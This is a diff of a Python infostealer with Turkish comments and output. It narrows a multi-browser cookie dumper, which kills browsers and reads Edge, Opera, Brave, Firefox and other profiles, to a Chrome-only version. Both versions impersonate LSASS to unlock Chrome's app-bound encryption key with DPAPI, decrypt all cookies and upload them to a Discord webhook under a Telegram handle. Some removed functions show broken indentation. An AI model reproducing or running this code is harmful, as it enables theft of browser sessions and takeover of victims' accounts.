@@ -9,7 +9,6 @@ import pathlib
 import binascii
 import requests
 import time
-import subprocess
 from datetime import datetime
 from contextlib import contextmanager
 
@@ -25,36 +24,6 @@ def is_admin():
         return ctypes.windll.shell32.IsUserAnAdmin() != 0
     except:
         return False
-
-def kill_browsers():
-    """Chrome hariç tüm tarayıcıları kill et"""
-    browsers_to_kill = [
-        "msedge.exe",      # Edge
-        "opera.exe",       # Opera
-        "firefox.exe",     # Firefox
-        "brave.exe",       # Brave
-        "vivaldi.exe",     # Vivaldi
-        "epic.exe",        # Epic
-        "browser.exe",     # Yandex
-        "chrome.exe"       # Chrome (son olarak)
-    ]
-    
-    print("🔪 Tarayıcılar kapatılıyor...")
-    
-    for browser in browsers_to_kill:
-        try:
-            # Taskkill ile process'i sonlandır
-            result = subprocess.run(['taskkill', '/F', '/IM', browser], 
-                                  capture_output=True, text=True, timeout=5)
-            if result.returncode == 0:
-                print(f"✅ {browser} kapatıldı")
-            else:
-                print(f"ℹ️ {browser} zaten kapalı veya bulunamadı")
-        except Exception as e:
-            print(f"❌ {browser} kapatma hatası: {e}")
-    
-    print("⏳ Tarayıcıların tamamen kapanması için 3 saniye bekleniyor...")
-    time.sleep(3)
 
 @contextmanager
 def impersonate_lsass():
@@ -94,11 +63,6 @@ def parse_key_blob(blob_data: bytes) -> dict:
         # [flag|encrypted_aes_key|iv|ciphertext|tag] decrypted_blob
         # [1byte|32bytes|12bytes|32bytes|16bytes]
         parsed_data['encrypted_aes_key'] = buffer.read(32)
-        parsed_data['iv'] = buffer.read(12)
-        parsed_data['ciphertext'] = buffer.read(32)
-        parsed_data['tag'] = buffer.read(16)
-    elif parsed_data['flag'] == 50:
-        # Edge için özel flag - basit parsing
         parsed_data['iv'] = buffer.read(12)
         parsed_data['ciphertext'] = buffer.read(32)
         parsed_data['tag'] = buffer.read(16)
@@ -158,8 +122,6 @@ def byte_xor(ba1, ba2):
     return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
 
 def derive_v20_master_key(parsed_data: dict) -> bytes:
-    cipher = None
-    
     if parsed_data['flag'] == 1:
         aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
         cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
@@ -172,70 +134,28 @@ def derive_v20_master_key(parsed_data: dict) -> bytes:
             decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
         xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
         cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
-    elif parsed_data['flag'] == 50:
-        # Edge için özel flag - AES ile dene
-        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
-        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
-
-    if cipher is None:
-        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")
 
     return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
 
-def find_firefox_profile():
-    """Firefox profile'ını bul"""
-    user_profile = os.environ['USERPROFILE']
-    firefox_path = rf"{user_profile}\AppData\Roaming\Mozilla\Firefox\Profiles"
-    
-    print(f"🔍 Firefox profile aranıyor: {firefox_path}")
-    
-    if not os.path.exists(firefox_path):
-        print("❌ Firefox: Profiles klasörü bulunamadı")
-        return None
-    
-    profiles = os.listdir(firefox_path)
-    print(f"📁 Firefox: {len(profiles)} profile bulundu")
-    
-    # Önce default profile'ları kontrol et
-    for profile in profiles:
-        print(f"🔍 Firefox: {profile} kontrol ediliyor...")
-        if profile.endswith('.default') or profile.endswith('.default-release'):
-            cookies_path = os.path.join(firefox_path, profile, "cookies.sqlite")
-            if os.path.exists(cookies_path):
-                print(f"✅ Firefox: {profile} profile'ında cookies.sqlite bulundu")
-                return cookies_path
-            else:
-                print(f"❌ Firefox: {profile} profile'ında cookies.sqlite bulunamadı")
-    
-    # Default bulunamazsa tüm profile'ları kontrol et
-    print("🔍 Firefox: Default profile bulunamadı, tüm profile'lar kontrol ediliyor...")
-    for profile in profiles:
-        cookies_path = os.path.join(firefox_path, profile, "cookies.sqlite")
-        if os.path.exists(cookies_path):
-            print(f"✅ Firefox: {profile} profile'ında cookies.sqlite bulundu")
-            return cookies_path
-    
-    print("❌ Firefox: Hiçbir profile'da cookies.sqlite bulunamadı")
-    return None
-
-def save_cookies_netscape_simple(cookies_data, filename, browser_name):
-    """Cookie'leri basit Netscape formatında kaydet"""
+def save_cookies_to_file(cookies_data, filename):
+    """Cookie'leri dosyaya kaydet"""
     try:
         with open(filename, 'w', encoding='utf-8') as f:
             f.write("-------------------------HTTPS://T.ME/HAIRO13X7-----------------\n")
             for cookie in cookies_data:
                 f.write(f"{cookie['domain']}\tTRUE\t/\tFALSE\t0\t{cookie['name']}\t{cookie['value']}\n")
-        print(f"✅ {browser_name} cookie'leri {filename} dosyasına kaydedildi!")
+        print(f"✅ Cookie'ler {filename} dosyasına kaydedildi!")
         return True
     except Exception as e:
-        print(f"❌ {browser_name} kaydetme hatası: {e}")
+        print(f"❌ Dosya kaydetme hatası: {e}")
         return False
 
-def send_browser_cookies_to_discord(cookies_data, webhook_url, browser_name):
-    """Her tarayıcı için ayrı dosya gönder"""
+def send_cookies_to_discord(cookies_data, webhook_url):
+    """Cookie'leri Discord'a gönder"""
     try:
-        filename = f"{browser_name.lower()}_cookies.txt"
-        save_cookies_netscape_simple(cookies_data, filename, browser_name)
+        filename = "hairo13x7.txt"
+        if not save_cookies_to_file(cookies_data, filename):
+            return False
         
         # Discord webhook payload
         files = {
@@ -245,7 +165,7 @@ def send_browser_cookies_to_discord(cookies_data, webhook_url, browser_name):
         # Mesaj içeriği
         content = f"<:email_spacex:1429086532811358350> https://t.me/hairo13x7\n"
         content += f"<a:billing_postal:1429086529300598895> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-        content += f"<a:billing_spacex:1429086530965868654> {browser_name}: {len(cookies_data)} cookie\n"
+        content += f"<a:billing_spacex:1429086530965868654> Chrome: {len(cookies_data)} cookie\n"
         
         payload = {
             'content': content,
@@ -260,413 +180,88 @@ def send_browser_cookies_to_discord(cookies_data, webhook_url, browser_name):
         files['file'][1].close()
         
         if response.status_code == 200:
-            print(f"✅ {browser_name} cookie'leri Discord'a gönderildi!")
+            print(f"✅ Cookie'ler Discord'a gönderildi!")
             return True
         else:
-            print(f"❌ {browser_name} Discord gönderim hatası: {response.status_code}")
+            print(f"❌ Discord gönderim hatası: {response.status_code}")
             return False
             
     except Exception as e:
-        print(f"❌ {browser_name} Discord webhook hatası: {e}")
+        print(f"❌ Discord webhook hatası: {e}")
         return False
 
-def extract_chrome_cookies(local_state_path, cookie_db_path):
-    """Chrome cookie'lerini çıkar (orijinal yöntem - hiç dokunulmaz)"""
-    try:
-        if not os.path.exists(local_state_path) or not os.path.exists(cookie_db_path):
-            return []
-        
-        print(f"🔍 Chrome cookie'leri çıkarılıyor...")
-        
-        # Read Local State
-        with open(local_state_path, "r", encoding="utf-8") as f:
-            local_state = json.load(f)
-
-        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
-        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
-        key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
-        
-        # Decrypt with SYSTEM DPAPI
-        with impersonate_lsass():
-            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
-
-        # Decrypt with user DPAPI
-        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
-        
-        # Parse key blob
-        parsed_data = parse_key_blob(key_blob_user_decrypted)
-        v20_master_key = derive_v20_master_key(parsed_data)
-
-        # Cookie'leri oku
-        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
-        cur = con.cursor()
-        r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
-        cookies = cur.fetchall()
-        cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
-        con.close()
-
-        # Cookie'leri çöz
-        def decrypt_cookie_v20(encrypted_value):
-            cookie_iv = encrypted_value[3:3+12]
-            encrypted_cookie = encrypted_value[3+12:-16]
-            cookie_tag = encrypted_value[-16:]
-            cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
-            decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
-            return decrypted_cookie[32:].decode('utf-8')
-
-        cookies_data = []
-        for c in cookies_v20:
-            try:
-                decrypted_value = decrypt_cookie_v20(c[2])
-                cookies_data.append({
-                    'domain': c[0],
-                    'name': c[1], 
-                    'value': decrypted_value,
-                    'browser': 'Chrome'
-                })
-            except Exception as e:
-                print(f"❌ Chrome hatası: {c[0]} - {c[1]} - {e}")
-        
-        print(f"✅ Chrome: {len(cookies_data)} cookie çözüldü")
-        return cookies_data
-        
-    except Exception as e:
-        print(f"❌ Chrome cookie çıkarma hatası: {e}")
-        return []
-
-def extract_chrome_based_cookies(local_state_path, cookie_db_path, browser_name):
-    """Chrome tabanlı tarayıcılar için cookie çıkar"""
-    try:
-        if not os.path.exists(local_state_path) or not os.path.exists(cookie_db_path):
-            return []
-        
-        print(f"🔍 {browser_name} cookie'leri çıkarılıyor...")
-   
-    # Read Local State
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = json.load(f)
-
-    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
-    assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
-    key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
-    
-    # Decrypt with SYSTEM DPAPI
-    with impersonate_lsass():
-        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
-
-    # Decrypt with user DPAPI
-    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
-    
-    # Parse key blob
-    parsed_data = parse_key_blob(key_blob_user_decrypted)
-    v20_master_key = derive_v20_master_key(parsed_data)
-
-        # Cookie'leri oku
-        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
-        cur = con.cursor()
-        r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
-        cookies = cur.fetchall()
-        cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
-        con.close()
-
-        # Cookie'leri çöz
-        def decrypt_cookie_v20(encrypted_value):
-            cookie_iv = encrypted_value[3:3+12]
-            encrypted_cookie = encrypted_value[3+12:-16]
-            cookie_tag = encrypted_value[-16:]
-            cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
-            decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
-            return decrypted_cookie[32:].decode('utf-8')
-
-        cookies_data = []
-        for c in cookies_v20:
-            try:
-                decrypted_value = decrypt_cookie_v20(c[2])
-                cookies_data.append({
-                    'domain': c[0],
-                    'name': c[1], 
-                    'value': decrypted_value,
-                    'browser': browser_name
-                })
-            except Exception as e:
-                print(f"❌ {browser_name} hatası: {c[0]} - {c[1]} - {e}")
-        
-        print(f"✅ {browser_name}: {len(cookies_data)} cookie çözüldü")
-        return cookies_data
-        
-    except Exception as e:
-        print(f"❌ {browser_name} cookie çıkarma hatası: {e}")
-        return []
-
-def extract_edge_cookies(local_state_path, cookie_db_path):
-    """Edge cookie'lerini çıkar - Chrome yöntemi ile"""
-    try:
-        if not os.path.exists(local_state_path) or not os.path.exists(cookie_db_path):
-            return []
-        
-        print(f"🔍 Edge cookie'leri çıkarılıyor...")
-        
-        # Edge için Chrome yöntemini kullan
-        # Read Local State
-        with open(local_state_path, "r", encoding="utf-8") as f:
-            local_state = json.load(f)
-
-        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
-        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
-        key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
-        
-        # Decrypt with SYSTEM DPAPI
-        with impersonate_lsass():
-            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
-
-        # Decrypt with user DPAPI
-        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
-        
-        # Parse key blob
-        parsed_data = parse_key_blob(key_blob_user_decrypted)
-        v20_master_key = derive_v20_master_key(parsed_data)
-
-        # Cookie'leri oku
-        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
-        cur = con.cursor()
-        r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
-        cookies = cur.fetchall()
-        cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
-        con.close()
-
-        # Cookie'leri çöz
-        def decrypt_cookie_v20(encrypted_value):
-            cookie_iv = encrypted_value[3:3+12]
-            encrypted_cookie = encrypted_value[3+12:-16]
-            cookie_tag = encrypted_value[-16:]
-            cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
-            decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
-            return decrypted_cookie[32:].decode('utf-8')
-
-        cookies_data = []
-        for c in cookies_v20:
-            try:
-                decrypted_value = decrypt_cookie_v20(c[2])
-                cookies_data.append({
-                    'domain': c[0],
-                    'name': c[1], 
-                    'value': decrypted_value,
-                    'browser': 'Edge'
-                })
-            except Exception as e:
-                print(f"❌ Edge hatası: {c[0]} - {c[1]} - {e}")
-        
-        print(f"✅ Edge: {len(cookies_data)} cookie çözüldü")
-        return cookies_data
-        
-    except Exception as e:
-        print(f"❌ Edge cookie çıkarma hatası: {e}")
-        return []
-
-def extract_opera_cookies(local_state_path, cookie_db_path):
-    """Opera cookie'lerini çıkar - Chrome yöntemi ile"""
-    try:
-        if not os.path.exists(local_state_path) or not os.path.exists(cookie_db_path):
-            return []
-        
-        print(f"🔍 Opera cookie'leri çıkarılıyor...")
-        
-        # Opera için Chrome yöntemini kullan
-        # Read Local State
-        with open(local_state_path, "r", encoding="utf-8") as f:
-            local_state = json.load(f)
-
-        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
-        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
-        key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
-        
-        # Decrypt with SYSTEM DPAPI
-        with impersonate_lsass():
-            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
-
-        # Decrypt with user DPAPI
-        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
-        
-        # Parse key blob
-        parsed_data = parse_key_blob(key_blob_user_decrypted)
-        v20_master_key = derive_v20_master_key(parsed_data)
-
-        # Cookie'leri oku
-    con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
-    cur = con.cursor()
-    r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
-    cookies = cur.fetchall()
-    cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
-    con.close()
-
-        # Cookie'leri çöz
-    def decrypt_cookie_v20(encrypted_value):
-        cookie_iv = encrypted_value[3:3+12]
-        encrypted_cookie = encrypted_value[3+12:-16]
-        cookie_tag = encrypted_value[-16:]
-        cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
-        decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
-        return decrypted_cookie[32:].decode('utf-8')
-
-        cookies_data = []
-    for c in cookies_v20:
-            try:
-                decrypted_value = decrypt_cookie_v20(c[2])
-                cookies_data.append({
-                    'domain': c[0],
-                    'name': c[1], 
-                    'value': decrypted_value,
-                    'browser': 'Opera'
-                })
-            except Exception as e:
-                print(f"❌ Opera hatası: {c[0]} - {c[1]} - {e}")
-        
-        print(f"✅ Opera: {len(cookies_data)} cookie çözüldü")
-        return cookies_data
-        
-    except Exception as e:
-        print(f"❌ Opera cookie çıkarma hatası: {e}")
-        return []
-
-def extract_firefox_cookies(cookie_db_path):
-    """Firefox cookie'lerini dümdüz çıkar (şifreleme yok)"""
-    try:
-        if not cookie_db_path or not os.path.exists(cookie_db_path):
-            print("❌ Firefox: Cookie dosyası bulunamadı")
-            return []
-        
-        print(f"🔍 Firefox cookie'leri çıkarılıyor...")
-        print(f"📁 Firefox cookie dosyası: {cookie_db_path}")
-        
-        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
-        cur = con.cursor()
-        
-        # Firefox cookie tablosunu kontrol et
-        try:
-            r = cur.execute("SELECT host, name, value from moz_cookies;")
-            cookies = cur.fetchall()
-            print(f"✅ Firefox: moz_cookies tablosu bulundu, {len(cookies)} cookie")
-        except:
-            # Alternatif tablo adları
-            try:
-                r = cur.execute("SELECT host, name, value from cookies;")
-                cookies = cur.fetchall()
-                print(f"✅ Firefox: cookies tablosu bulundu, {len(cookies)} cookie")
-            except:
-                print("❌ Firefox: Cookie tablosu bulunamadı")
-                con.close()
-                return []
-        
-        con.close()
-
-        cookies_data = []
-        for c in cookies:
-            cookies_data.append({
-                'domain': c[0],
-                'name': c[1], 
-                'value': c[2],  # Firefox'ta şifreleme yok, direkt value
-                'browser': 'Firefox'
-            })
-        
-        print(f"✅ Firefox: {len(cookies_data)} cookie çözüldü")
-        return cookies_data
-        
-    except Exception as e:
-        print(f"❌ Firefox cookie çıkarma hatası: {e}")
-        return []
-
 def main():
-    # Sabit webhook URL
+    # Webhook URL
     WEBHOOK_URL = "%WEBHOOK%"
     
-    print("🍪 Multi-Browser Cookie Dumper")
-    print("=============================")
+    print("🍪 Chrome Cookie Dumper")
+    print("======================")
     
-    # Tarayıcıları kill et
-    kill_browsers()
-    
-    # Tüm tarayıcı cookie'lerini topla
-    all_cookies = []
-    
-    # Tarayıcı yolları
+    # chrome data path
     user_profile = os.environ['USERPROFILE']
-    
-    # Chrome (orijinal yöntem - hiç dokunulmaz)
-    chrome_local_state = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
-    chrome_cookies = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
-    chrome_cookies_data = extract_chrome_cookies(chrome_local_state, chrome_cookies)
-    all_cookies.extend(chrome_cookies_data)
-    
-    # Edge
-    edge_local_state = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State"
-    edge_cookies = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"
-    edge_cookies_data = extract_edge_cookies(edge_local_state, edge_cookies)
-    all_cookies.extend(edge_cookies_data)
-    
-    # Opera
-    opera_local_state = rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable\User Data\Local State"
-    opera_cookies = rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable\User Data\Default\Network\Cookies"
-    opera_cookies_data = extract_opera_cookies(opera_local_state, opera_cookies)
-    all_cookies.extend(opera_cookies_data)
-    
-    # Chrome tabanlı tarayıcılar
-    chrome_based_browsers = [
-        {
-            "name": "Brave",
-            "local_state": rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
-            "cookies": rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
-        },
-        {
-            "name": "Vivaldi",
-            "local_state": rf"{user_profile}\AppData\Local\Vivaldi\User Data\Local State",
-            "cookies": rf"{user_profile}\AppData\Local\Vivaldi\User Data\Default\Network\Cookies"
-        },
-        {
-            "name": "Epic",
-            "local_state": rf"{user_profile}\AppData\Local\Epic Privacy Browser\User Data\Local State",
-            "cookies": rf"{user_profile}\AppData\Local\Epic Privacy Browser\User Data\Default\Network\Cookies"
-        },
-        {
-            "name": "Yandex",
-            "local_state": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data\Local State",
-            "cookies": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
-        }
-    ]
-    
-    # Chrome tabanlı tarayıcıları çıkar
-    for browser_config in chrome_based_browsers:
-        try:
-            cookies_data = extract_chrome_based_cookies(browser_config["local_state"], browser_config["cookies"], browser_config["name"])
-            all_cookies.extend(cookies_data)
-        except Exception as e:
-            print(f"❌ {browser_config['name']} cookie çıkarma hatası: {e}")
-    
-    # Firefox cookie'leri (özel yöntem)
-    firefox_cookie_path = find_firefox_profile()
-    firefox_cookies_data = extract_firefox_cookies(firefox_cookie_path)
-    all_cookies.extend(firefox_cookies_data)
-    
-    print(f"\n📊 Toplam {len(all_cookies)} cookie tüm tarayıcılardan çözüldü!")
-    
-    if len(all_cookies) == 0:
-        print("❌ Hiç cookie bulunamadı!")
-        return
-    
-    # Tarayıcıya göre grupla
-    browsers = {}
-    for cookie in all_cookies:
-        browser = cookie.get('browser', 'Unknown')
-        if browser not in browsers:
-            browsers[browser] = []
-        browsers[browser].append(cookie)
-    
-    # Her tarayıcı için ayrı dosya gönder
-    print(f"\n🚀 Cookie'ler Discord'a gönderiliyor...")
-    for browser_name, browser_cookies in browsers.items():
-        if len(browser_cookies) > 0:
-            print(f"📤 {browser_name} cookie'leri gönderiliyor...")
-            send_browser_cookies_to_discord(browser_cookies, WEBHOOK_URL, browser_name)
-            time.sleep(1)  # Rate limit için bekle
+    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
+    cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
+   
+    try:
+        # Read Local State
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+
+        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
+        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
+        key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
+        
+        # Decrypt with SYSTEM DPAPI
+        with impersonate_lsass():
+            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
+
+        # Decrypt with user DPAPI
+        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
+        
+        # Parse key blob
+        parsed_data = parse_key_blob(key_blob_user_decrypted)
+        v20_master_key = derive_v20_master_key(parsed_data)
+
+        # fetch all v20 cookies
+        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
+        cur = con.cursor()
+        r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
+        cookies = cur.fetchall()
+        cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
+        con.close()
+
+        # decrypt v20 cookie with AES256GCM
+        def decrypt_cookie_v20(encrypted_value):
+            cookie_iv = encrypted_value[3:3+12]
+            encrypted_cookie = encrypted_value[3+12:-16]
+            cookie_tag = encrypted_value[-16:]
+            cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
+            decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
+            return decrypted_cookie[32:].decode('utf-8')
+
+        # Cookie'leri topla
+        cookies_data = []
+        for c in cookies_v20:
+            try:
+                decrypted_value = decrypt_cookie_v20(c[2])
+                cookies_data.append({
+                    'domain': c[0],
+                    'name': c[1], 
+                    'value': decrypted_value
+                })
+            except Exception as e:
+                print(f"❌ Cookie decrypt hatası: {c[0]} - {c[1]} - {e}")
+        
+        print(f"✅ Chrome: {len(cookies_data)} cookie çözüldü")
+        
+        # Discord'a gönder
+        if cookies_data:
+            send_cookies_to_discord(cookies_data, WEBHOOK_URL)
+        else:
+            print("❌ Hiç cookie bulunamadı!")
+            
+    except Exception as e:
+        print(f"❌ Chrome cookie çıkarma hatası: {e}")
 
 if __name__ == "__main__":
     if not is_admin():
